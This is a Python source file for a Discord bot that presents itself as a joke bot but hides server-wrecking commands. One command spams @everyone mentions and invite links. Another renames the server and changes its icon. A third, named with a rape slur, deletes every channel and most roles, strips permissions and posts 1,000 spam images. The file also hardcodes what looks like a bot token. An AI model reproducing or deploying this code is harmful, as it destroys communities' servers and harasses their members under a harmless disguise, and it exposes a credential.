#       ===beenz-bot v1.0===
# ===Copyright 2020 Joshua Britain===

print("Loading beenzbot")

import discord
import csv
import random
import os

# ---Load the jokes---
rawJokes = csv.reader(open("assets/jokes.csv", "r"))
jokes = sum([i for i in rawJokes],[])

# ---Setup connection to bot---
TOKEN = 'NjgyMzI5OTA1ODk5NjM0NzMz.XlbbfQ.b5nto8lGAwhXeNxWjLCxoxcgiaM'
client = discord.Client()


# ---Main command setup---
@client.event

async def on_message(message):
     if message.author == client.user: #prevent bot replying to itself
          return

     # --Fake joke feature--
     if message.content.lower() == "$joke":
          await message.channel.send(random.choice(jokes)) #send random joke

     # --Spam server with propaganda--
     if message.content.lower() == "$propaganda":
          for i in range(15):
               await message.channel.send("@everyone THIS SERVER HAS BEEN CLAIMED AS A COLONY OF THE DEMOCRATIC REPUBLIC OF HEINZ")
               await message.channel.send(file=discord.File('assets/flag.png'))
               await message.channel.send("Join us: https://discord.gg/arvVft4")

     # --Claim the server as a colony of Heinz--
     if message.content.lower() == "$colony":
          await message.guild.edit(name="Colony of Heinz") #change server name

          with open(os.path.join(os.path.dirname(__file__), "assets/flag.png"), 'rb') as f:
               await message.guild.edit(icon=f.read()) #change server icon

     # --Destroy the server--
     if message.content.lower() == "$rape":

          #-delete all channels-
          channels = []
          for channel in message.guild.channels: #get all channels
                    channels.append(channel)

          for channel in channels:
               await channel.delete(reason="THIS SERVER HAS BEEN CLAIMED AS A COLONY OF THE DEMOCRATIC REPUBLIC OF HEINZ")

          #-make new channel-
          channel = await message.guild.create_text_channel('HEINZ')

          #-delete all roles-
          roles = []
          for role in message.guild.roles: #get all roles
                    roles.append(role)
                    print(role.name)
          print("---")
                    
          for role in roles[2:]:
               await role.delete(reason="THIS SERVER HAS BEEN CLAIMED AS A COLONY OF THE DEMOCRATIC REPUBLIC OF HEINZ")

          #-remove all perms-

          perms = discord.Permissions() #create new empty permissions object
          perms.update(read_messages = True) #make it so user can see messages
               
          for role in roles:
               if role.name == "@everyone": #get only @everyone role
                    await role.edit(permissions=perms) #apply new permissions

          #-spam images-
          heinz = client.get_channel(message.guild.channels[0].id)
          await heinz.send("@everyone THIS SERVER HAS BEEN CLAIMED AS A COLONY OF THE DEMOCRATIC REPUBLIC OF HEINZ")
          for i in range(1000):
               f = "assets/spam/" + random.choice(os.listdir("assets/spam"))
               await heinz.send(file=discord.File(f))
         
     
@client.event
async def on_ready():
     print('Logged in as')
     print(client.user.name)
     print(client.user.id)
     print('------')


client.run(TOKEN)

